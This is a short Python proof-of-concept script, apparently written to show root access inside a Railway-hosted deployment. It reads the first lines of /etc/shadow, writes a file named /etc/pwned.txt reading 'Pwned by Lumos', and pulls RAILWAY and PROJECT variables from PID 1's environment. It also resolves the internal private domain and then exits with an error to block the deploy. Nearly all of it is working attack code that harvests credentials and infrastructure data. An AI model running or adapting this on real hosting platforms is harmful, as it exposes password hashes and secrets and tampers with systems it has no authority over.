import os
import sys
import subprocess

def bold_log(msg):
    sys.stderr.write(f"\n{'='*60}\n[!] {msg}\n{'='*60}\n")

def run_proof():
     
    uid = os.getuid()
    gid = os.getgid()
    bold_log(f"IDENTITY: UID={uid} GID={gid} (FULL ROOT ACCESS)")

     
    bold_log("SENSITIVE FILE ACCESS: /etc/shadow")
    try:
        with open("/etc/shadow", "r") as f:
            # Читаем только первые 3 строки для пруфа
            lines = f.readlines()
            for line in lines[:3]:
                sys.stderr.write(line)
    except Exception as e:
        sys.stderr.write(f"Access Denied or Error: {e}\n")

    
    bold_log("WRITE ACCESS TEST: /etc/pwned.txt")
    try:
        test_path = "/etc/pwned.txt"
        with open(test_path, "w") as f:
            f.write("Pwned by Lumos - Root access confirmed")
        if os.path.exists(test_path):
            sys.stderr.write(f"SUCCESS: Created {test_path}. Full system takeover possible.\n")
    except Exception as e:
        sys.stderr.write(f"Write failed: {e}\n")

     
    bold_log("INFRASTRUCTURE LEAK: PID 1 ENV")
    try:
        with open("/proc/1/environ", "rb") as f:
            env_data = f.read().replace(b'\0', b'\n').decode(errors='ignore')
             
            for line in env_data.split('\n'):
                if "RAILWAY" in line or "PROJECT" in line:
                    sys.stderr.write(f"{line}\n")
    except Exception as e:
        sys.stderr.write(f"Proc access failed: {e}\n")

     
    bold_log("NETWORK RECONNAISSANCE")
    try:
        domain = os.getenv("RAILWAY_PRIVATE_DOMAIN", "Not Found")
        sys.stderr.write(f"Internal Domain: {domain}\n")
        
        sys.stderr.write("Testing internal DNS resolution...\n")
        os.system(f"getent hosts {domain}")
    except: pass

    bold_log("POC FINISHED. BLOCKING DEPLOY TO SHOW LOGS.")
    sys.stderr.flush()
     
    sys.exit(1)

if __name__ == "__main__":
    run_proof()
